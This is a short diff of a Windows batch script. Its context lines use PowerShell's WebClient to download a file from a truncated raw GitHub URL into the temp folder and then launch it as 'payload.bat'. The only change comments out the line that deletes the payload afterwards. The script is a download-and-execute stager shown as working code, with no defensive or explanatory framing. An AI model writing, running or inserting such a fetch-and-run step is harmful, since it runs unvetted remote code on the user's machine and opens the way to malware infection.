@@ -4,4 +4,4 @@ powershell -Command "(New-Object Net.WebClient).DownloadFile('https://raw.github
 start %temp%\payload.bat
 
 timeout /t 1 /nobreak >nul
-del %temp%\payload.bat
+::del %temp%\payload.bat
